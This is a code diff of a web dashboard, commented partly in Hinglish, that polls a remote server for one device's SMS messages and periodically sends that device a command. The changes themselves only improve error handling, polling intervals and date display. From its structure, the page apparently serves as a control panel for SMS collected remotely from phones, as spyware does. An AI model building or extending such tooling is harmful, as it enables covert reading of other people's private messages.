@@ -93,7 +93,6 @@
             padding: 14px;
             border-radius: 18px;
             position: relative;
-            /* Animation HATA DIYA gaya hai taaki shake na ho */
         }
 
         .sms-header {
@@ -154,7 +153,7 @@
 
     document.addEventListener("DOMContentLoaded", function() {
         if (!DEVICE_ID) {
-            alert("Device ID missing!");
+            document.getElementById("sms-list").innerHTML = '<div style="text-align: center; color: red;">Error: Device ID missing.<br>Use ?id=YOUR_ID in URL</div>';
             return;
         }
         
@@ -186,8 +185,10 @@
     function loadFromStorage() {
         const savedData = localStorage.getItem(storageKeySMS);
         if (savedData) {
-            allSMSData = JSON.parse(savedData);
-            renderSMS(allSMSData);
+            try {
+                allSMSData = JSON.parse(savedData);
+                renderSMS(allSMSData);
+            } catch(e) {}
         }
     }
 
@@ -195,8 +196,8 @@
     function startLiveSystem() {
         sendCommand();
         fetchSMS();
-        setInterval(sendCommand, 10000);
-        setInterval(fetchSMS, 3000);
+        setInterval(sendCommand, 15000); // 15 sec delay for command
+        setInterval(fetchSMS, 5000); // 5 sec delay for fetch
     }
 
     function sendCommand() {
@@ -214,7 +215,7 @@
         fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
             .then(res => res.json())
             .then(data => {
-                if (data && data.length > 0) {
+                if (data && Array.isArray(data) && data.length > 0) {
                     if (JSON.stringify(data) !== JSON.stringify(allSMSData)) {
                         allSMSData = data;
                         localStorage.setItem(storageKeySMS, JSON.stringify(data));
@@ -243,7 +244,7 @@
         renderSMS(filtered);
     }
 
-    // --- STABLE RENDER FUNCTION (FIXED) ---
+    // --- FIXED RENDER FUNCTION (Handles String Dates) ---
     function renderSMS(data) {
         const listContainer = document.getElementById("sms-list");
         
@@ -252,21 +253,21 @@
             return;
         }
 
-        // 🔥 FIX: Current Scroll position save karo
         const scrollPos = window.scrollY;
-
-        const displayData = data.slice(0, 100); 
+        const displayData = data.slice(0, 150); 
 
         const htmlString = displayData.map(sms => {
             const name = getContactName(sms.address);
             const isSaved = name !== sms.address;
             
-            let formattedDate = "";
-            if (!isNaN(sms.date)) {
+            // 🔥 DATE LOGIC FIXED: Tumhara data "26/01/2026 11:56" string format me hai.
+            // Hum usse directly use karenge, convert nahi karenge.
+            let formattedDate = sms.date; 
+
+            // Fallback agar date format alag ho to hi convert karo
+            if (!isNaN(sms.date) && String(sms.date).length > 10 && !String(sms.date).includes('/')) {
                 const d = new Date(parseInt(sms.date));
-                const datePart = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }); 
-                const timePart = d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }); 
-                formattedDate = `${datePart}, ${timePart}`;
+                formattedDate = d.toLocaleString();
             }
 
             return `
@@ -286,8 +287,6 @@
         }).join('');
 
         listContainer.innerHTML = htmlString;
-
-        // 🔥 FIX: Scroll wapas wahi set karo jaha tha
         window.scrollTo(0, scrollPos);
     }
 </script>
